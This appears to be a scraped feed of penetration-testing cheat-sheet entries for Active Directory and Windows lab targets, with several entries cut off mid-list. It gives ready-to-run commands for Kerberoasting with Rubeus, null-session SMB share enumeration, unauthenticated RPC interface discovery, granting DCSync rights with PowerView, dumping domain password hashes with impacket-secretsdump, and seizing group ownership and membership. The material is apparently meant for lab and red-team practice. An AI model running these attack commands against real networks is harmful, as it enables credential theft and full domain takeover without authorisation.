item.description: From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:example.com /dc:dc.example.com /creduser:example.com\username /credpassword:password /nowrap 2. Generate NTLM .\rubeus.exe hash /password:password 3. Get domain SID Locally import-module activedirectory Get-ADDomain | fl DomainSID Remotely # Install ldp.exe (Windows 11) Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services' # Bind > Bind with credentials ldp.exe # Browse > Search BaseDN: DC=example,DC=com Filter: (objectclass=User) 4.

item.title: SMB Enum
item.description: SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 10.10.11.10 Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 -u null --no-banner # List known share smbmap -H 10.10.11.10 -r 'share' smbclient smbclient -N -L \\\\10.10.11.10\\ # After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.10.11.10\\ --option='client min protocol=NT1' Login with password smbmap smbmap -H 10.

item.title: Windows ACLs
item.description: Window ACLs (Access Control Lists) Check ACLs # Check a file/directory icacls "C:\Users\User" # Check all files and directories icacls * /C Grant user full control # cmd cmd.exe /c cacls file_name /E /G user:F # powershell icacls file_name /grant user:F Change owner (WO) # cmd cmd.exe /c takeown /F file_name +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+

item.title: Windows RPC
item.description: Windows RPC # Show mappings impacket-rpcmap 'ncacn_ip_tcp:10.10.11.10' IOXIDResolver # Get network interface without auth python3 IOXIDResolver.py -t 10.10.11.10

item.title: WriteDacl
item.description: Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10

item.title: WriteOwner/Own
item.description: Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Change owner of the group (From Windows) Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USERNAME> Abuse #2 : Add user to the group (From Windows) Authenticated Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity <USERNAME> -Rights All -DomainController <DC> Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> Runas $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>/<USERNAME>', $password) Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USERNAME>' -Rights All -DomainController <DC> -Credential $cred Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> -Credential $cred Check Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName # Or net user <USERNAME> # Exit current sessions or re-login whoami /groups Abuse #2 : Add user to the group (From Linux) 0.
